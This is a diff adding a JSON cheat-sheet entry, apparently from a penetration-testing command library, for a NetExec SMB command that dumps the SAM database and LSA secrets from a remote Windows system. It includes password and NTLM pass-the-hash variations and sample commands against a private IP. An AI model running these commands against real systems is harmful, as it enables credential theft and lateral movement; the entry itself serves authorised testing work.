@@ -1,0 +1,37 @@
+{
+  "id": "nxc-smb-sam-lsa",
+  "name": "NetExec SMB SAM & LSA Dump",
+  "command": "nxc smb '<ip>' -u '<user>' -p '<password>' --sam --lsa",
+  "description": "Dump SAM database and LSA secrets from a remote Windows system via NetExec",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "smb"
+  ],
+  "tags": [
+    "nxc",
+    "smb",
+    "sam",
+    "lsa",
+    "hashes",
+    "dump"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' --sam --lsa"
+    },
+    {
+      "label": "With Log File",
+      "requires": "password",
+      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' --sam --lsa --log nxc-dump"
+    }
+  ],
+  "examples": [
+    "nxc smb '192.168.1.31' -u 'user' -p 'password' --sam --lsa",
+    "nxc smb '192.168.1.31' -u 'user' -p 'password' --sam --lsa --log us-mgmt-sam"
+  ]
+}
